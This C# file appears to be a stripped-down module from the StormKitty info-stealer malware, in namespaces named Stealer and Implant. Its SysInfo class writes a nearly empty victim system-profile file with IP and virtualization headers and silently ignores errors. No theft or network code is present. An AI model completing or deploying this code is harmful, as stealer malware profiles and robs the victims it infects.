using StormKitty;
using StormKitty.Implant;

namespace Stealer
{
    internal sealed class SysInfo
    {
        public static void Save(string sSavePath)
        {
            try
            {
                string SystemInfoText = (""
                    + "\n[IP]"
                    
                    + "\n[Virtualization]"
             
                    + "\n");
                System.IO.File.WriteAllText(sSavePath, SystemInfoText);
            } catch (System.Exception ex) {  }
        }
    }
}
